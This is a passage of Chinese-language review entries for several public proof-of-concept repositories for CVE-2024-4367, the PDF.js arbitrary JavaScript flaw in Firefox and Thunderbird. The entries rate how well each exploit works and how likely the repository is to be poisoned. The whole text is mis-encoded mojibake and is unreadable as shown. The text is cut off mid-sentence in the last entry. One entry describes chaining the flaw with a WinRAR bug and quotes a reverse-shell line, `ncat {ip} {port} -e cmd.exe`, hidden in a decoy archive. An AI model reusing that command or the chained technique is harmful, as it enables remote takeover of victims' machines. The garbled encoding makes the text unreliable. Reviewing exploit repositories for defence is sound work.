**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #8

**æ¥æº**: [CVE-2024-4367-PenguinCabinet_CVE-2024-4367-hands-on.md](../2024/CVE-2024-4367-PenguinCabinet_CVE-2024-4367-hands-on.md)

## CVE-2024-4367-Firefox-PDF.js ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»(XSS)å’Œä¿¡æ¯æ³„éœ²ã€‚

**å½±å“ç‰ˆæœ¬:** < Firefox 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2024-4367æ˜¯Mozilla Firefoxã€Firefox ESRå’ŒThunderbirdä¸­PDF.jsç»„ä»¶çš„ä¸€ä¸ªæ¼æ´ã€‚è¯¥æ¼æ´æºäºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚æ”»å‡»è€…å¯ä»¥åˆ¶ä½œä¸€ä¸ªç‰¹åˆ¶çš„PDFæ–‡ä»¶ï¼Œå½“ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„Firefoxç‰ˆæœ¬æ‰“å¼€è¯¥æ–‡ä»¶æ—¶ï¼Œæ¶æ„JavaScriptä»£ç å°†è¢«æ‰§è¡Œã€‚ 

**æœ‰æ•ˆæ€§ï¼š**

æä¾›çš„POCä»£ç çœ‹èµ·æ¥æ˜¯æœ‰æ•ˆçš„ã€‚`README.md` æ–‡ä»¶ä¸­æä¾›äº†åˆ©ç”¨æ­¥éª¤ï¼š
1.  ä½¿ç”¨ `CVE-2024-4367.py` è„šæœ¬ç”ŸæˆåŒ…å«æ¶æ„JavaScriptä»£ç çš„ `poc.pdf` æ–‡ä»¶ã€‚
2.  ä½¿ç”¨ `firefox.py` è„šæœ¬å¯åŠ¨æ˜“å—æ”»å‡»ç‰ˆæœ¬çš„Firefox (ä¾‹å¦‚ 125ç‰ˆ)ï¼Œå¹¶è‡ªåŠ¨æ‰“å¼€ `poc.pdf`ã€‚
3.  éªŒè¯æ˜¯å¦æ‰§è¡Œäº†JavaScriptä»£ç ï¼Œæ˜¯å¦å¼¹å‡ºäº†alertçª—å£ã€‚

`firefox.py` è„šæœ¬å¯ä»¥ä¸‹è½½å¹¶å¯åŠ¨æŒ‡å®šç‰ˆæœ¬çš„Firefox Nightlyç‰ˆæœ¬ï¼Œè¿™æ–¹ä¾¿äº†æ¼æ´çš„éªŒè¯ã€‚è„šæœ¬è¿˜åŒ…å«äº†ä¸‹è½½ç‰¹å®šç‰ˆæœ¬Firefoxçš„é“¾æ¥ã€‚

**æŠ•æ¯’é£é™©ï¼š**

å¯¹æä¾›çš„POCä»£ç è¿›è¡Œäº†åˆ†æï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ï¼Œçº¦ä¸º5%ã€‚é£é™©ä¸»è¦æ¥è‡ªäºä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š

1.  **`firefox.py`è„šæœ¬:**
    *   è¯¥è„šæœ¬ä¼šä»Mozillaçš„å®˜æ–¹FTPæœåŠ¡å™¨ä¸‹è½½Firefox Nightlyç‰ˆæœ¬ã€‚è™½ç„¶è¿™æ˜¯å®˜æ–¹æ¥æºï¼Œä½†æ”»å‡»è€…å¯èƒ½åœ¨æœªæ¥ç¯¡æ”¹è¿™äº›FTPæœåŠ¡å™¨ï¼ˆè™½ç„¶å¯èƒ½æ€§æä½ï¼‰ã€‚æˆ–è€…ï¼Œåœ¨ä¸‹è½½è¿‡ç¨‹ä¸­å‘ç”Ÿä¸­é—´äººæ”»å‡»ï¼Œä»è€Œä¸‹è½½è¢«ç¯¡æ”¹çš„Firefoxç‰ˆæœ¬ã€‚
    *   è¯¥è„šæœ¬åŒ…å« `subprocess.run` å‡½æ•°ï¼Œç”¨äºæ‰§è¡Œä¸‹è½½çš„Firefoxã€‚å¦‚æœæ”»å‡»è€…èƒ½å¤Ÿæ§åˆ¶è„šæœ¬æ‰§è¡Œçš„å‚æ•°ï¼Œå¯èƒ½ä¼šæ³¨å…¥é¢å¤–çš„å‚æ•°ï¼Œå¯¼è‡´æ‰§è¡Œæ¶æ„ä»£ç ã€‚
    *   å°½ç®¡è„šæœ¬çš„ç›®çš„ä¼¼ä¹æ˜¯ä¸ºäº†æ–¹ä¾¿åœ°ä¸‹è½½å’Œå¯åŠ¨ç‰¹å®šç‰ˆæœ¬çš„Firefoxï¼Œä½†ç”¨æˆ·ä»ç„¶éœ€è¦ä»”ç»†æ£€æŸ¥è„šæœ¬çš„å†…å®¹ï¼Œç¡®ä¿ä¸‹è½½é“¾æ¥å’Œæ‰§è¡Œè¿‡ç¨‹æ˜¯å®‰å…¨çš„ã€‚
2.  **`CVE-2024-4367.py`è„šæœ¬ (æœªæä¾›å…·ä½“ä»£ç ):**
    *   è™½ç„¶`README.md`æŒ‡å‘ä¸€ä¸ªå¤–éƒ¨githubåº“ï¼Œä½†å¦‚æœæ­¤åº“è¢«ç¯¡æ”¹ï¼Œæ‰§è¡Œè„šæœ¬`CVE-2024-4367.py`ç”Ÿæˆçš„`poc.pdf`æ–‡ä»¶æœ‰å¯èƒ½åµŒå…¥æ›´æ¶æ„çš„Payload.
3.  **å…è´£å£°æ˜:**
    *   `README.md` ä¸­åŒ…å«å…è´£å£°æ˜ï¼Œè¿™è¡¨æ˜ä½œè€…æ„è¯†åˆ°æ½œåœ¨çš„é£é™©ï¼Œå¹¶è¯•å›¾æ’‡æ¸…è´£ä»»ã€‚ä½†è¿™å¹¶ä¸èƒ½å®Œå…¨æ¶ˆé™¤é£é™©ï¼Œç”¨æˆ·ä»ç„¶éœ€è¦è‡ªè¡Œæ‰¿æ‹…ä½¿ç”¨POCä»£ç çš„åæœã€‚

æ€»çš„æ¥è¯´ï¼Œè¯¥ä»“åº“çš„ä¸»è¦ç›®çš„æ˜¯ä¸ºäº†æ¼”ç¤ºæ¼æ´åˆ©ç”¨ï¼Œè€Œä¸æ˜¯ä¸ºäº†è¿›è¡Œæ¶æ„æ”»å‡»ã€‚ä½†æ˜¯ï¼Œç”¨æˆ·åœ¨ä½¿ç”¨è¿™äº›ä»£ç æ—¶ä»ç„¶éœ€è¦ä¿æŒè­¦æƒ•ï¼Œä»”ç»†å®¡æŸ¥ä»£ç å†…å®¹ï¼Œç¡®ä¿äº†è§£æ½œåœ¨çš„é£é™©ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **æ¼æ´è§¦å‘:** æ”»å‡»è€…éœ€è¦åˆ¶ä½œåŒ…å«ç‰¹å®šæ ¼å¼çš„æ¶æ„PDFæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åˆ©ç”¨äº†PDF.jsåœ¨å¤„ç†å­—ä½“æ—¶ç±»å‹æ£€æŸ¥çš„ç¼ºå¤±ã€‚
2.  **JavaScriptæ‰§è¡Œ:** å½“å—å®³è€…ä½¿ç”¨å—å½±å“çš„Firefoxç‰ˆæœ¬æ‰“å¼€è¯¥PDFæ–‡ä»¶æ—¶ï¼ŒPDF.jsä¼šå°è¯•è§£ææ¶æ„å­—ä½“æ•°æ®ï¼Œç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå¯¼è‡´ä»»æ„JavaScriptä»£ç åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œã€‚
3.  **æ”»å‡»ç›®æ ‡:** æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ‰§è¡Œçš„JavaScriptä»£ç æ¥çªƒå–æ•æ„Ÿä¿¡æ¯ï¼ˆä¾‹å¦‚ cookiesï¼‰ã€æ‰§è¡Œè·¨ç«™è„šæœ¬æ”»å‡»(XSS)ã€æˆ–è€…è¿›è¡Œå…¶ä»–æ¶æ„æ´»åŠ¨ã€‚

**æ€»ç»“ï¼š**
è¯¥æ¼æ´å…è®¸æ”»å‡»è€…é€šè¿‡æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œåœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚ç”±äºFirefoxé»˜è®¤ä½¿ç”¨PDF.jsæ‰“å¼€PDFæ–‡ä»¶ï¼Œå› æ­¤è¯¥æ¼æ´å…·æœ‰è¾ƒé«˜çš„å½±å“èŒƒå›´ã€‚æä¾›çš„POCä»£ç å¯ä»¥å¸®åŠ©å®‰å…¨ç ”ç©¶äººå‘˜éªŒè¯å’Œç†è§£è¯¥æ¼æ´ï¼Œä½†ä¹Ÿéœ€è¦æ³¨æ„æ½œåœ¨çš„å®‰å…¨é£é™©ã€‚

**é¡¹ç›®åœ°å€:** [PenguinCabinet/CVE-2024-4367-hands-on](https://github.com/PenguinCabinet/CVE-2024-4367-hands-on)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #9

**æ¥æº**: [CVE-2024-4367-Scivous_CVE-2024-4367-npm.md](../2024/CVE-2024-4367-Scivous_CVE-2024-4367-npm.md)

## CVE-2024-4367-PDF.jså­—ä½“å¤„ç†ç±»å‹æ£€æŸ¥ç¼ºå¤±å¯¼è‡´ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç 

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç”¨æˆ·æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2024-4367æ¼æ´æºäºPDF.jsåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œåˆ©ç”¨è¯¥æ¼æ´åœ¨PDF.jsçš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚æ¼æ´å½±å“Firefox, Firefox ESR, Thunderbirdã€‚ æ ¹æ®æœç´¢ç»“æœï¼ŒGitHubä¸Šå­˜åœ¨åˆ©ç”¨æ­¤æ¼æ´çš„POCä»£ç ã€‚ æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç (README.md)æ¯”è¾ƒç®€å•ï¼Œä»…ä»…æè¿°äº†CVE-2024-4367çš„å¤ç°ï¼Œä»è¯¥æ–‡ä»¶æ¥çœ‹ï¼ŒæŠ•æ¯’çš„æ¦‚ç‡è¾ƒä½ã€‚ä½†è€ƒè™‘åˆ°å®é™…çš„æ¼æ´åˆ©ç”¨ä»£ç å¯èƒ½åœ¨å…¶ä»–æ–‡ä»¶ä¸­ï¼Œéœ€è¦è¿›ä¸€æ­¥åˆ†ææ‰èƒ½ç¡®å®šæ˜¯å¦å­˜åœ¨æŠ•æ¯’è¡Œä¸ºã€‚æ¼æ´åˆ©ç”¨æ–¹å¼æ˜¯é€šè¿‡ç²¾å¿ƒæ„é€ çš„PDFæ–‡ä»¶è§¦å‘å­—ä½“å¤„ç†è¿‡ç¨‹ä¸­çš„ç±»å‹æ£€æŸ¥ç¼ºå¤±ï¼Œä»è€Œæ‰§è¡Œæ¶æ„JavaScriptä»£ç ã€‚CVSSè¯„åˆ†æ ¹æ®NVDçš„å˜æ›´è®°å½•ï¼Œä»åŸæ¥çš„CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:Lä¿®æ”¹ä¸ºäº†NIST AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H, è¿™è¡¨æ˜åˆ©ç”¨æ¡ä»¶å˜çš„å®¹æ˜“ï¼Œå±å®³æ€§æ›´é«˜äº†ã€‚å¦å¤–ï¼Œæœ‰è®¨è®ºè¡¨æ˜115.19.0esrä»ç„¶å—æ­¤æ¼æ´å½±å“ï¼Œéœ€è¦è¿›ä¸€æ­¥éªŒè¯ã€‚

**é¡¹ç›®åœ°å€:** [Scivous/CVE-2024-4367-npm](https://github.com/Scivous/CVE-2024-4367-npm)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #10

**æ¥æº**: [CVE-2024-4367-UnHackerEnCapital_PDFernetRemotelo.md](../2024/CVE-2024-4367-UnHackerEnCapital_PDFernetRemotelo.md)

## CVE-2024-4367 & CVE-2023-38831 PDFernet Remotelo

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** PDF.js å­—ä½“å¤„ç†ç±»å‹æ£€æŸ¥ç¼ºå¤±å¯¼è‡´ä»»æ„JavaScriptæ‰§è¡Œ & WinRARå‘½ä»¤æ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird, WinRAR

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æ”»å‡»è€…è¿œç¨‹æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11, WinRAR <= 6.22

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡ç³»ç»Ÿéœ€å®‰è£…å—å½±å“ç‰ˆæœ¬çš„Firefox/Thunderbirdå’ŒWinRARï¼Œä¸”ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

è¯¥POCåˆ©ç”¨äº†CVE-2024-4367 (PDF.jså­—ä½“å¤„ç†ç±»å‹æ£€æŸ¥ç¼ºå¤±å¯¼è‡´ä»»æ„JavaScriptæ‰§è¡Œ) å’Œ CVE-2023-38831 (WinRARå‘½ä»¤æ‰§è¡Œ) ä¸¤ä¸ªæ¼æ´ã€‚

**æ¼æ´åˆ©ç”¨æ–¹å¼:**
1.  **CVE-2024-4367:**  é€šè¿‡æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œç»•è¿‡PDF.jsçš„ç±»å‹æ£€æŸ¥ï¼Œåœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚
2.  **CVE-2023-38831:**  åˆ©ç”¨WinRARå¤„ç†å‹ç¼©åŒ…æ—¶çš„å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚æ¶æ„raræ–‡ä»¶ä¸­åŒ…å«pdfå’Œbatè„šæœ¬,å½“ç”¨æˆ·å°è¯•æ‰“å¼€è¿™ä¸ªPDFæ–‡æ¡£æ—¶ï¼Œä¼šè§¦å‘WinRARæ¼æ´ï¼Œæ‰§è¡Œæ†ç»‘çš„BATè„šæœ¬ã€‚
3.  **POCä»£ç æµç¨‹:**
    *   ä¸»è„šæœ¬`PDFernetRemotelo.py`æç¤ºç”¨æˆ·è¾“å…¥æ”»å‡»è€…IPå’Œç«¯å£ã€‚
    *   åˆ›å»ºè¯±é¥µPDFæ–‡ä»¶ï¼ˆ`ResumendeSueldo.pdf`ï¼‰å’Œä¸€ä¸ªåŒ…å«åå‘shellå‘½ä»¤çš„BATè„šæœ¬ï¼ˆ`script.bat`ï¼‰ï¼Œè„šæœ¬å†…å®¹ä¸º`ncat {ip} {port} -e cmd.exe`ã€‚
    *   ä½¿ç”¨`PDFernet.py`è„šæœ¬ç”ŸæˆåŒ…å«æ¶æ„JavaScriptçš„`poc.pdf`æ–‡ä»¶ï¼Œè¯¥JavaScriptä»£ç ç”±ç”¨æˆ·æä¾›çš„payloadç”Ÿæˆï¼Œæ­¤payloadä¼šè¢«åµŒå…¥åˆ°PDFçš„å­—ä½“ä¿¡æ¯ä¸­.
    *   `Remotelo.py`è„šæœ¬åˆ›å»ºä¸€ä¸ªRARå‹ç¼©åŒ…ï¼ˆ`PDFernetRemotelo.rar`ï¼‰ï¼Œå…¶ä¸­åŒ…å«è¯±é¥µPDFæ–‡ä»¶å’ŒBATè„šæœ¬ã€‚
    *   ç”¨æˆ·æ‰“å¼€`PDFernetRemotelo.rar`ä¸­çš„`ResumendeSueldo.pdf`ï¼Œè§¦å‘CVE-2024-4367ï¼Œæ‰§è¡ŒåµŒå…¥çš„æ¶æ„JavaScriptä»£ç ã€‚
    *   æ¶æ„JavaScriptä»£ç å¯èƒ½è§¦å‘CVE-2023-38831ï¼Œæ‰§è¡ŒRARå‹ç¼©åŒ…ä¸­çš„`script.bat`ï¼Œå»ºç«‹ä¸æ”»å‡»è€…æœºå™¨çš„åå‘shellã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°:**
æ ¹æ®æ¼æ´ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œè¯¥POCåœ¨å—å½±å“çš„ç‰ˆæœ¬ä¸­æ˜¯æœ‰æ•ˆçš„ã€‚GitHubä¸Šå·²ç»æœ‰è¯¥æ¼æ´çš„æ­¦å™¨åŒ–åˆ©ç”¨ã€‚

**æŠ•æ¯’é£é™©è¯„ä¼°:**
è¯¥POCä»£ç çš„ä¸»è¦åŠŸèƒ½æ˜¯ç”ŸæˆåŒ…å«æ¶æ„ä»£ç çš„PDFå’ŒRARæ–‡ä»¶ï¼Œå…¶æ ¸å¿ƒåŠŸèƒ½æ˜¯åˆ©ç”¨å·²çŸ¥çš„æ¼æ´ã€‚`PDFernetRemotelo.py` ä½¿ç”¨äº†å¤–éƒ¨è„šæœ¬ `PDFernet.py`å’Œ `Remotelo.py`ï¼Œå®¡æŸ¥è¿™äº›è„šæœ¬ï¼Œå‘ç°`PDFernet.py`ä¸­çš„payloadç”Ÿæˆé€»è¾‘æ˜¯å¯æ§çš„ï¼Œç›´æ¥æ¥è‡ªäºç”¨æˆ·æä¾›çš„å‚æ•°ã€‚`Remotelo.py`è„šæœ¬åˆ›å»ºRARå‹ç¼©åŒ…çš„è¿‡ç¨‹æ¯”è¾ƒæ ‡å‡†ã€‚æŠ•æ¯’é£é™©åœ¨äºï¼š
1.  **ä¾èµ–å¤–éƒ¨è„šæœ¬:** `PDFernetRemotelo.py` è°ƒç”¨äº†`PDFernet.py` å’Œ `Remotelo.py` è„šæœ¬,å­˜åœ¨æ¶æ„ä¿®æ”¹æ­¤è„šæœ¬çš„å¯èƒ½æ€§.
2.   **PayloadåµŒå…¥æ–¹å¼:** æ¶æ„ä»£ç åµŒå…¥åœ¨PDFå­—ä½“ä¿¡æ¯ä¸­ï¼Œå¦‚æœå¯¹PDFæ ¼å¼ä¸ç†Ÿæ‚‰ï¼Œå¾ˆéš¾ç›´æ¥çœ‹å‡ºæ˜¯å¦å­˜åœ¨æ¶æ„ä»£ç ã€‚å®¡æŸ¥æ—¶éœ€è°¨æ…ã€‚
3.   **éšè”½æ€§:** åˆ©ç”¨RARå‹ç¼©åŒ…å°†PDFå’ŒBATè„šæœ¬æ†ç»‘åœ¨ä¸€èµ·ï¼Œå¢åŠ äº†æ”»å‡»çš„éšè”½æ€§ã€‚

ä»£ç ä¸­å¯èƒ½å­˜åœ¨çš„æŠ•æ¯’ç‚¹åœ¨äºï¼š
1.  åœ¨`PDFernet.py`ä¸­ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šæ·»åŠ é¢å¤–çš„JavaScriptä»£ç ï¼Œæ‰§è¡Œæ¶æ„æ“ä½œï¼Œä¾‹å¦‚ä¸‹è½½æ¶æ„æ–‡ä»¶æˆ–çªƒå–ç”¨æˆ·æ•°æ®ã€‚
2.  åœ¨ç”Ÿæˆçš„RARå‹ç¼©åŒ…ä¸­ï¼Œå¯èƒ½ä¼šæ·»åŠ é¢å¤–çš„æ–‡ä»¶ï¼Œä¾‹å¦‚æ¶æ„DLLæ–‡ä»¶æˆ–åé—¨ç¨‹åºã€‚

åŸºäºä»¥ä¸Šåˆ†æï¼Œè™½ç„¶æ ¸å¿ƒä»£ç çœ‹èµ·æ¥æ¯”è¾ƒç›´æ¥ï¼Œä½†è€ƒè™‘åˆ°ä¾èµ–å¤–éƒ¨è„šæœ¬ä»¥åŠpayloadåµŒå…¥æ–¹å¼çš„éšè”½æ€§ï¼Œä»ç„¶å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ã€‚ä¿å®ˆä¼°è®¡æŠ•æ¯’é£é™©ä¸º10%ã€‚

**é¡¹ç›®åœ°å€:** [UnHackerEnCapital/PDFernetRemotelo](https://github.com/UnHackerEnCapital/PDFernetRemotelo)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #11

**æ¥æº**: [CVE-2024-4367-VVeakee_CVE-2024-4367.md](../2024/CVE-2024-4367-VVeakee_CVE-2024-4367.md)

## CVE-2024-4367-PDF.js-ä»»æ„JavaScriptä»£ç æ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** PDF.js (Firefox, Firefox ESR, Thunderbird)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** < Firefox 126, < Firefox ESR 115.11, < Thunderbird 115.11

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç”¨æˆ·æ‰“å¼€æ¶æ„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2024-4367æ˜¯Mozilla PDF.jsä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œç”±äºå¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œå½“å—å®³è€…ä½¿ç”¨å­˜åœ¨æ¼æ´çš„Firefoxã€Firefox ESRæˆ–Thunderbirdæ‰“å¼€è¯¥æ–‡ä»¶æ—¶ï¼Œå³å¯æ‰§è¡ŒåµŒå…¥çš„JavaScriptä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„POCä»£ç åˆ©ç”¨äº†è¯¥æ¼æ´ã€‚`CVE-2024-4367.py`è„šæœ¬èƒ½å¤Ÿç”ŸæˆåŒ…å«æ¶æ„JavaScriptä»£ç çš„PDFæ–‡ä»¶ï¼Œè¿™æ®µä»£ç è¢«åµŒå…¥åˆ°PDFçš„å­—ä½“å®šä¹‰ä¸­ã€‚æœç´¢ç»“æœä¸­`exfil0/WEAPONIZING-CVE-2024-4367`ä¹Ÿå°è¯äº†è¯¥æ¼æ´çš„å¯åˆ©ç”¨æ€§ã€‚

**æŠ•æ¯’é£é™©ï¼š**
æŸ¥çœ‹æä¾›çš„ä»£ç ï¼Œ`CVE-2024-4367.py`è„šæœ¬çš„åŠŸèƒ½æ˜¯ç”ŸæˆåŒ…å«ç”¨æˆ·æŒ‡å®špayloadçš„PDFæ–‡ä»¶ï¼Œæ²¡æœ‰å‘ç°æ¶æ„ä»£ç æˆ–åé—¨ã€‚`win_calc.pdf`æ–‡ä»¶ç›´æ¥åŒ…å«æ‰§è¡Œ`calc`ç¨‹åºçš„ JavaScript ä»£ç ï¼ŒåŠŸèƒ½æ˜ç¡®ã€‚`xss.pdf` æ–‡ä»¶å†…å®¹ä¸å®Œæ•´ï¼Œæ— æ³•åˆ†æã€‚å› æ­¤ï¼Œè¯¥ä»“åº“çš„æŠ•æ¯’é£é™©è¾ƒä½ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…ä½¿ç”¨`CVE-2024-4367.py`è„šæœ¬ï¼Œé€šè¿‡å‘½ä»¤è¡Œå‚æ•°æŒ‡å®šè¦æ‰§è¡Œçš„JavaScriptä»£ç ï¼Œç”Ÿæˆæ¶æ„çš„PDFæ–‡ä»¶ã€‚
2.  æ”»å‡»è€…è¯±ä½¿ç”¨æˆ·æ‰“å¼€è¯¥PDFæ–‡ä»¶ï¼Œä¾‹å¦‚é€šè¿‡ç”µå­é‚®ä»¶ã€ç½‘ç«™ç­‰æ–¹å¼ã€‚
3.  å½“ç”¨æˆ·ä½¿ç”¨å­˜åœ¨æ¼æ´çš„Firefoxã€Firefox ESRæˆ–Thunderbirdæ‰“å¼€è¯¥PDFæ–‡ä»¶æ—¶ï¼ŒPDF.jsè§£æå™¨ä¼šæ‰§è¡ŒPDFæ–‡ä»¶ä¸­åµŒå…¥çš„æ¶æ„JavaScriptä»£ç ã€‚
4.  è¯¥JavaScriptä»£ç å¯ä»¥æ‰§è¡Œä»»æ„æ“ä½œï¼Œä¾‹å¦‚çªƒå–ç”¨æˆ·ä¿¡æ¯ã€å®‰è£…æ¶æ„è½¯ä»¶ç­‰ã€‚

æ€»ä¹‹ï¼Œæ­¤æ¼æ´çš„CVSSè¯„åˆ†ä¸ºMediumï¼ˆ5.6ï¼‰ï¼Œä½†æ˜¯é€šè¿‡ä¿®æ”¹NVDæ•°æ®å¯ä»¥çœ‹åˆ°ï¼Œè¯¥æ¼æ´å¯èƒ½é€ æˆçš„å±å®³ç¨‹åº¦æ˜¯å¾ˆé«˜çš„ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„PDFæ–‡ä»¶ï¼Œè¯±éª—ç”¨æˆ·æ‰“å¼€ï¼Œä»è€Œæ‰§è¡Œä»»æ„JavaScriptä»£ç ï¼Œå¯¼è‡´ä¸¥é‡çš„åæœã€‚æä¾›çš„PoCçš„æœ‰æ•ˆæ€§è¾ƒé«˜ï¼Œä¸”å½“å‰ä»£ç æœªå‘ç°å­˜åœ¨æŠ•æ¯’é£é™©ã€‚

**é¡¹ç›®åœ°å€:** [VVeakee/CVE-2024-4367](https://github.com/VVeakee/CVE-2024-4367)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #12

**æ¥æº**: [CVE-2024-4367-Zombie-Kaiser_cve-2024-4367-PoC-fixed.md](../2024/CVE-2024-4367-Zombie-Kaiser_cve-2024-4367-PoC-fixed.md)

## CVE-2024-4367-Mozilla-PDF.jsä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (é€šè¿‡ PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²å’Œæ½œåœ¨çš„è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆåœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­ï¼‰

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„æ„é€ çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ Mozilla Firefoxï¼ŒFirefox ESR å’Œ Thunderbird ä¸­ PDF.js åº“ä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚æ”»å‡»è€…å¯ä»¥åˆ›å»ºä¸€ä¸ªç‰¹åˆ¶çš„ PDF æ–‡æ¡£ï¼Œå½“ç›®æ ‡ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„ Firefoxï¼ŒFirefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€æ­¤ PDF æ–‡ä»¶æ—¶ï¼Œå³å¯æ‰§è¡ŒåµŒå…¥çš„æ¶æ„ JavaScript ä»£ç ã€‚æ¼æ´åˆ©ç”¨æ–¹å¼æ˜¯é€šè¿‡ç»•è¿‡ PDF.js 